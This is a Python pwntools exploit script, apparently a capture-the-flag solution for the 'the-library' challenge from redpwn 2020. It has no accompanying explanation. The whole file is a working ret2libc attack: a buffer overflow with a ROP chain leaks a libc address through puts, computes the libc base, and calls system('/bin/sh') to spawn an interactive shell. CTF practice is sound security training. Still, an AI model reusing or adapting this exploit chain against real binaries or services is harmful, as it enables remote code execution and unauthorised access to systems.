#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
debug = 1
elf = './the-library'

if debug:
    io = process([elf])
else:
    io = remote('2020.redpwnc.tf', 31350)

rop = ROP(elf)
binary = ELF(elf)
libc = ELF('./libc.so.6')

PUTS_PLT = binary.plt['puts']
LIBC_START_MAIN = binary.symbols['__libc_start_main']
MAIN_PLT = binary.symbols['main']

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

io.recvuntil("Welcome to the library... What's your name?")
log.info("puts@plt: " + hex(PUTS_PLT))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

payload = 24 * b'A' + p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(PUTS_PLT) + p64(MAIN_PLT)

io.clean()
io.sendline(payload)

recieved = io.recvline()
recieved = io.recvline()
recieved = io.recvline().strip()

leak = u64(recieved.ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))
libc.address = leak - libc.sym["__libc_start_main"]
BINSH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.sym["system"]

payload = 24 * b'A' + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
io.sendline(payload)

io.interactive()
